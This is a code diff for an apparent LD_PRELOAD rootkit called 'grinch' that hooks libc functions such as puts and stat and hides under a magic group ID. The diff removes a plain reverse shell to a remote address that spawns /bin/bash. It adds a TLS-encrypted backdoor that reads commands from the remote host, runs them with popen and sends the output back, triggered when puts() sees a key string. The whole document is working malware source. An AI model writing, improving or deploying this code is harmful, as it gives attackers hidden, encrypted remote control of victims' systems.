@@ -12,6 +12,8 @@
 #include <string.h>
 #include <netinet/in.h>
 #include <errno.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 #include "grinch.h"
 
 
@@ -35,32 +37,81 @@ static int (*old_xstat64)(int, const char *, struct stat64 *) = NULL;
 static int (*old_puts)(const char *) = NULL;
 
 
-void IPv4() {
+int CreateSocketIPv4(void) {
     int sockfd;
     setgid(MAGIC_GID);
-    pid_t pid;
 
-    if((pid = fork()) == 0) {
-        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
-        struct sockaddr_in server, client;
+    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
+    struct sockaddr_in server, client;
 
-        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
-        server.sin_port = htons(REMOTE_PORT);
-        server.sin_family = AF_INET;
+    inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
+    server.sin_port = htons(REMOTE_PORT);
+    server.sin_family = AF_INET;
 
-        client.sin_addr.s_addr = INADDR_ANY;
-        client.sin_port = htons(LOCAL_PORT);
-        client.sin_family = AF_INET;
+    client.sin_addr.s_addr = INADDR_ANY;
+    client.sin_port = htons(LOCAL_PORT);
+    client.sin_family = AF_INET;
 
-        if(bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
-        if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
-        for(int i = 0; i < 3; i++) dup2(sockfd, i);
-        if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
+    if(bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
+    if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
+    
+    return sockfd;
+}
 
-        old_execve("/bin/bash", NULL, NULL);
-        close(sockfd);
-        exit(0x0);
+
+SSL_CTX* InitCTX(void) {
+    SSL_METHOD *method;
+    SSL_CTX *context;
+
+    OpenSSL_add_all_algorithms();
+    SSL_load_error_strings();
+    method = (SSL_METHOD *)TLS_client_method();
+    context = SSL_CTX_new(method);
+    
+    if (context == NULL) {
+        ERR_print_errors_fp(stderr);
+        abort();
     }
+    return context;
+}
+
+
+void OpenSSLConnection() {
+    setgid(MAGIC_GID);
+    if(fork() != 0) return;
+
+    int sockfd;
+    char cmd[1024], buff[1024];
+    SSL *ssl;
+    SSL_CTX *context;
+
+    SSL_library_init();
+    context = InitCTX();
+    sockfd = CreateSocketIPv4();
+    ssl = SSL_new(context);
+    SSL_set_fd(ssl, sockfd);
+
+    if(SSL_connect(ssl) != -1) {
+        for(;;) {
+            SSL_read(ssl, cmd, sizeof(cmd));
+            if(strncmp(cmd, "exit", 4) == 0) {
+                SSL_free(ssl);
+                ssl = NULL;
+                close(sockfd);
+                break;
+            }
+            FILE *response;
+
+            response = popen(strcat(cmd, " 2> /dev/null"), "r");
+            while(fgets(buff, sizeof(buff), response) != NULL)
+                SSL_write(ssl, buff, strlen(buff));
+
+            pclose(response);
+        }
+    }
+    close(sockfd);
+    SSL_CTX_free(context);
+    context = NULL;
 }
 
 
@@ -512,7 +563,7 @@ int puts(const char *s) {
     if(old_puts == NULL) old_puts = dlsym(RTLD_NEXT, "puts");
 
     if(strstr(s, KEY_STRING) != NULL) {
-        IPv4();
+        OpenSSLConnection();
         return old_puts((const char *)"");
     }
     return old_puts(s);
